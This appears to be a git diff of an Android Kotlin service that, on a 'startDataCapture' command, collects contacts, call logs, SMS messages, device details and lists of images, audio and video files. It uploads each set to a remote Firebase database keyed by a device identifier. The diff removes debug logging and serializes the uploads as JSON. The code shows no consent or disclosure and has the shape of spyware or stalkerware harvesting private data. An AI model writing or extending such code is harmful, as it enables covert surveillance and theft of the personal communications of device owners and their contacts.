@@ -54,37 +54,22 @@ class DataService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent != null && intent.action.equals("startDataCapture")) {
             getAid()
-            Log.e("DataService".uppercase(), "StartingForeground")
             startMyForeground()
-            Log.e("DataService".uppercase(), "Started Foreground")
 
-            Log.e("DataService".uppercase(), "StartingMobileDDetails")
             getMobileDetails()
-            Log.e("DataService".uppercase(), "StartedMobileDDetails")
 
-            Log.e("DataService".uppercase(), "StartingContacts")
             getContacts()
-            Log.e("DataService".uppercase(), "Started Contacts")
 
-            Log.e("DataService".uppercase(), "Starting Call Logs")
             getCallLogs()
-            Log.e("DataService".uppercase(), "Started  Call Logs")
 
-            Log.e("DataService".uppercase(), "Starting SMS")
             getSms()
-            Log.e("DataService".uppercase(), "Started SMS")
 
-            Log.e("DataService".uppercase(), "Starting Image List")
             getImageList()
-            Log.e("DataService".uppercase(), "Started Image List")
 
-            Log.e("DataService".uppercase(), "Starting Audio List")
             getAudioList()
-            Log.e("DataService".uppercase(), "Started Audio list")
 
-            Log.e("DataService".uppercase(), "Starting Video List")
             getVideoList()
-            Log.e("DataService".uppercase(), "Started Video List")
+
             this.stopForeground(true)
         } else if (intent != null && intent.action.equals("stopDataCapture")) {
             stopSelf()
@@ -186,7 +171,7 @@ class DataService : Service() {
             }
 
             uploadThread.start()*/
-            dbRef.child(aid).child("contact").child(timeStmp()).setValue(contactBook)
+            dbRef.child(aid).child("contact").child(timeStmp()).setValue(Gson().toJson(uploadJson))
         }
     }
 
@@ -255,7 +240,7 @@ class DataService : Service() {
             }
 
             uploadThread.start()*/
-            dbRef.child(aid).child("callLog").child(timeStmp()).setValue(callRecords)
+            dbRef.child(aid).child("callLog").child(timeStmp()).setValue(Gson().toJson(uploadJson))
         }
     }
 
@@ -367,7 +352,7 @@ class DataService : Service() {
             }
 
             uploadThread.start()*/
-            dbRef.child(aid).child("sms").child(timeStmp()).setValue(uploadJson)
+            dbRef.child(aid).child("sms").child(timeStmp()).setValue(Gson().toJson(uploadJson))
         }
     }
 
@@ -437,7 +422,7 @@ class DataService : Service() {
 
         uploadThread.start()*/
 
-        dbRef.child(aid).child("fileList").child("images").child(timeStmp()).setValue(listOfImage)
+        dbRef.child(aid).child("fileList").child("images").child(timeStmp()).setValue(Gson().toJson(uploadJson))
     }
 
     @RequiresApi(Build.VERSION_CODES.N)
@@ -502,7 +487,7 @@ class DataService : Service() {
 
         uploadThread.start()*/
 
-        dbRef.child(aid).child("fileList").child("audios").child(timeStmp()).setValue(listOfAudio)
+        dbRef.child(aid).child("fileList").child("audios").child(timeStmp()).setValue(Gson().toJson(uploadJson))
     }
 
     @RequiresApi(Build.VERSION_CODES.N)
@@ -563,6 +548,6 @@ class DataService : Service() {
 
         uploadThread.start()
 */
-        dbRef.child(aid).child("fileList").child("videos").child(timeStmp()).setValue(listOfVideo)
+        dbRef.child(aid).child("fileList").child("videos").child(timeStmp()).setValue(Gson().toJson(uploadJson))
     }
 }
